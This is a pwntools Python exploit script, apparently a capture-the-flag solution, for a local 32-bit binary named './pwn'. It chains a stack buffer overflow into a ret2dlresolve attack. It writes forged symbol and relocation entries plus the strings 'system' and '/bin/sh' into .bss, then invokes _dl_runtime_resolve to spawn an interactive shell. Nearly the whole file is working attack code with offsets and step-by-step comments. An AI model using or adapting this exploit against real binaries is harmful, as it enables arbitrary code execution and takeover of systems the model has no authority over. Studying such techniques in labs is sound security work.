from pwn import *

elf = context.binary = ELF('./pwn', checksec=True)
p = process()

STRTAB, SYMTAB, JMPREL = map(elf.dynamic_value_by_tag, ["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL"])

buf = 0x804aaa0     #controllable area (.bss), align to 16

#Step 1
sym_offset = buf + (SYMTAB & 0xf) #align to 16 with SYMTAB offset
payload2_size = 39

payload1 = b"A" * (0x28 + 0x4)          # bytes enough to BOF
payload1 += p32(elf.symbols['read'])    # return to read after BOF
payload1 += p32(elf.symbols['fun'])     # return to fun after read call
payload1 += p32(0)                      # stdin
payload1 += p32(sym_offset)             # scan into new fake sym_offset
payload1 += p32(payload2_size)          # how many datas to scan

p.sendline(payload1)

#Step 2
rel_offset = sym_offset + 0x10      
symname_offset = rel_offset + 0x8
binsh_offset = symname_offset + 0x7

st_name = symname_offset - STRTAB
sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

r_offset = buf + 0x50
index_sym = (sym_offset - SYMTAB) >> 4
r_info = (index_sym << 8) | 0x7
rel_struct = p32(r_offset) + p32(r_info)

payload2 = b"" + sym_struct         # fake sym
payload2 += rel_struct              # fake rel
payload2 += b'system\0'             # fake symname
payload2 += b'/bin/sh\0'            # binsh

p.send(payload2)


#Step 3
resolve_offset = 0x80482eb
rel_plt_offset = rel_offset - JMPREL

payload3 = b'A' * (0x28 + 0x4)      # bytes enough to BOF
payload3 += p32(resolve_offset)     # _dl_runtime_resolve after BOF
payload3 += p32(rel_plt_offset)     # .rel.plt offset
payload3 += p32(0xdeadbeef)         # Next return address, dont need care
payload3 += p32(binsh_offset)       # address of "bin/sh"

p.sendline(payload3)
p.interactive()
